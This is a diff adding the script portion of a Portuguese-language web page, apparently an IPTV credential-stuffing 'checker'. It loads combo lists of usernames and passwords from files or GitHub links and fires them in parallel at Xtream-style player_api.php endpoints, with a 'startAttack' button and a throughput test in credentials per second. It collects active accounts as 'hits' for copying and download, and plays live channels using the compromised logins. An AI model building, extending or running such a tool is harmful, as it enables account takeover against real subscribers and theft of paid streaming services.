+function esc(s){ return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
+function escAttr(s){ return String(s).replace(/&/g,'&amp;').replace(/"/g,'&quot;').replace(/</g,'&lt;'); }
+function renderHits(){
+  const box=$('hitsContent'); box.innerHTML=''; const keys=Object.keys(state.hitsData);
+  if(!keys.length){ box.innerHTML='<p style="text-align:center;color:var(--muted);padding:20px">Nenhum resultado ainda.</p>'; return; }
+  const wrap=document.createElement('div'); wrap.className='hits-wrap';
+  keys.forEach(server=>{
+    const group=document.createElement('div'); group.className='hit-group';
+    const head=document.createElement('div'); head.className='hit-group-head'; head.textContent='🎯 '+server; group.appendChild(head);
+    (state.hitsData[server]||[]).forEach(h=>{
+      const item=document.createElement('div'); item.className='hit-item';
+      item.innerHTML=`<div class="hit-meta">
+        <span class="k">Usuário</span><span class="v lime">${esc(h.user)}</span>
+        <span class="k">Senha</span><span class="v">${esc(h.pass)}</span>
+        <span class="k">Plano</span><span class="v">${esc(h.plano)}</span>
+        <span class="k">Conexões</span><span class="v">${esc(h.conexoes)}</span>
+        <span class="k">Expira</span><span class="v">${esc(h.expDate)} (${esc(h.dias)})</span>
+      </div>
+      <div class="hit-links">
+        <button type="button" data-copy="${escAttr(h.user+':'+h.pass)}">Copiar user:pass</button>
+        <button type="button" data-copy="${escAttr(h.m3u)}">Copiar M3U</button>
+        <button type="button" data-copy="${escAttr(h.raw)}">Copiar card</button>
+      </div>
+      <div class="hit-raw">${esc(h.raw)}</div>`;
+      group.appendChild(item);
+    });
+    wrap.appendChild(group);
+  });
+  box.appendChild(wrap);
+  box.querySelectorAll('[data-copy]').forEach(btn=>{
+    btn.addEventListener('click',()=>{ navigator.clipboard.writeText(btn.getAttribute('data-copy')).then(()=>toast('Copiado!')); });
+  });
+}
+function showTab(name){
+  $('activityContent').classList.toggle('hidden',name!=='activity');
+  $('hitsContent').classList.toggle('hidden',name!=='hits');
+  if(name==='hits') renderHits();
+  document.querySelectorAll('.tab').forEach(t=>t.classList.toggle('active',t.dataset.tab===name));
+}
+function playStream(url){
+  const video=$('video-player'); if(hlsInstance){ hlsInstance.destroy(); hlsInstance=null; }
+  if(typeof Hls!=='undefined'&&Hls.isSupported()){ hlsInstance=new Hls(); hlsInstance.loadSource(url); hlsInstance.attachMedia(video); hlsInstance.on(Hls.Events.MANIFEST_PARSED,()=>video.play().catch(()=>{})); }
+  else if(video.canPlayType('application/vnd.apple.mpegurl')){ video.src=url; video.addEventListener('loadedmetadata',()=>video.play().catch(()=>{}),{once:true}); }
+}
+async function loadChannels(filter){
+  const grid=$('channel-grid'); grid.innerHTML='<p style="color:var(--muted)">Carregando...</p>';
+  if(!state.playerInfo.server){ grid.innerHTML='<p style="color:var(--rose)">Nenhum hit.</p>'; return; }
+  try{
+    const{server,user,pass}=state.playerInfo;
+    const res=await fetch(`${server}/player_api.php?username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}&action=get_live_streams`);
+    const channels=await res.json(); grid.innerHTML='';
+    if(!Array.isArray(channels)||!channels.length){ grid.innerHTML='<p style="color:var(--muted)">Sem canais.</p>'; return; }
+    let list=channels; if(filter) list=channels.filter(c=>c.name&&c.name.toLowerCase().includes(filter.toLowerCase()));
+    const cats={}; list.forEach(ch=>{ const cat=ch.category_name||'Outros'; if(!cats[cat]) cats[cat]=[]; cats[cat].push(ch); });
+    Object.entries(cats).forEach(([cat,chs])=>{
+      const t=document.createElement('div'); t.className='cat-title'; t.textContent=cat+' ('+chs.length+')'; grid.appendChild(t);
+      chs.slice(0,40).forEach(ch=>{ const b=document.createElement('button'); b.className='ch-btn'; b.textContent=ch.name||'Canal'; b.onclick=()=>playStream(`${server}/live/${user}/${pass}/${ch.stream_id}.m3u8`); grid.appendChild(b); });
+    });
+  }catch(e){ grid.innerHTML='<p style="color:var(--rose)">'+e.message+'</p>'; }
+}
+async function testSpeed(){
+  const servidorInput=$('servidorUnico').value.trim(); if(!servidorInput) return alert('Preencha o servidor!');
+  const texto=await getComboText(); if(!texto) return alert('Carregue um combo!');
+  const lines=parseComboText(texto).slice(0,80); if(!lines.length) return alert('Combo vazio!');
+  let url=servidorInput.startsWith('http')?servidorInput:'http://'+servidorInput; url=url.replace(/\/$/,'');
+  let hits=0,errors=0; const t0=Date.now();
+  await Promise.all(lines.map(async cred=>{
+    try{ const c=new AbortController(); const t=setTimeout(()=>c.abort(),5000);
+      const res=await fetch(`${url}/player_api.php?username=${encodeURIComponent(cred.user)}&password=${encodeURIComponent(cred.pass)}`,{signal:c.signal,cache:'no-store'});
+      clearTimeout(t); if(res.status===200){ try{ const d=JSON.parse(await res.text()); if(d.user_info&&String(d.user_info.status).toLowerCase()==='active') hits++; }catch(e){} }
+    }catch(e){ errors++; }
+  }));
+  const el=(Date.now()-t0)/1000; const speed=lines.length/Math.max(el,0.1);
+  $('speed-display').textContent=`${speed.toFixed(1)} cred/s (${lines.length} em ${el.toFixed(1)}s)`;
+  toast(`⚡ ${speed.toFixed(1)} cred/s · Hits ${hits} · Erros ${errors}`);
+}
+
+async function loadManualUrl(){
+  const input=$('combo-url-manual'); const st=$('combo-status');
+  let url=(input.value||'').trim(); if(!url){ st.textContent='Cole um link raw.'; st.className='combo-status err'; return; }
+  url=normalizeGithubRawUrl(url);
+  st.textContent='Baixando combo...'; st.className='combo-status loading';
+  try{
+    const texto=await fetchText(url); const lines=parseComboText(texto);
+    if(!lines.length) throw new Error('Sem user:pass no arquivo');
+    loadedComboText=texto; $('combo').value='';
+    st.textContent=`✅ Link direto — ${lines.length.toLocaleString('pt-BR')} credenciais`; st.className='combo-status ok';
+    toast('Combo baixado: '+lines.length+' linhas');
+  }catch(e){ loadedComboText=null; st.textContent='❌ '+(e.message||'Erro'); st.className='combo-status err'; }
+}
+
+document.addEventListener('DOMContentLoaded',()=>{
+  $('btn-combo-online').addEventListener('click',loadOnlineComboList);
+  $('btn-load-manual').addEventListener('click',loadManualUrl);
+  $('combo-url-manual').addEventListener('keydown',e=>{ if(e.key==='Enter') loadManualUrl(); });
+  $('combo-online-select').addEventListener('change',loadSelectedOnlineCombo);
+  $('combo').addEventListener('change',()=>{ if($('combo').files[0]){ loadedComboText=null; $('combo-online-select').value=''; $('combo-status').textContent='Arquivo local selecionado'; $('combo-status').className='combo-status ok'; }});
+  document.querySelector('.btn-start').addEventListener('click',startAttack);
+  document.querySelector('.btn-copy').addEventListener('click',copiarHits);
+  $('btn-download').addEventListener('click',downloadHits);
+  $('btn-save-per-server').addEventListener('click',salvarPorServidor);
+  document.querySelector('.btn-quit').addEventListener('click',()=>{ if(confirm('Fechar?')) window.close(); });
+  $('btn-speed-test').addEventListener('click',testSpeed);
+  $('btn-open-player').addEventListener('click',()=>{
+    if(!$('player-box').style.display||$('player-box').style.display==='none'){
+      if(!state.playerInfo.server) return alert('Execute o scan e obtenha um hit primeiro.');
+      $('player-box').style.display='block';
+    } else $('player-box').style.display='none';
+  });
+  $('btn-close-player').addEventListener('click',()=>{ $('player-box').style.display='none'; if(hlsInstance){hlsInstance.destroy();hlsInstance=null;} $('video-player').pause(); $('video-player').src=''; });
+  $('btn-load-channels').addEventListener('click',()=>loadChannels(null));
+  $('btn-load-cartoon').addEventListener('click',()=>loadChannels('cartoon'));
+  document.querySelectorAll('.tab').forEach(t=>t.addEventListener('click',()=>showTab(t.dataset.tab)));
+  document.querySelectorAll('.stat.clickable').forEach(item=>{
+    item.addEventListener('click',e=>{ e.stopPropagation(); const b=item.querySelector('.breakdown'); document.querySelectorAll('.breakdown.show').forEach(x=>x.classList.remove('show')); if(b) b.classList.toggle('show'); });
+  });
+  document.addEventListener('click',()=>document.querySelectorAll('.breakdown.show').forEach(x=>x.classList.remove('show')));
+});
+</script>
+</body>
+</html>
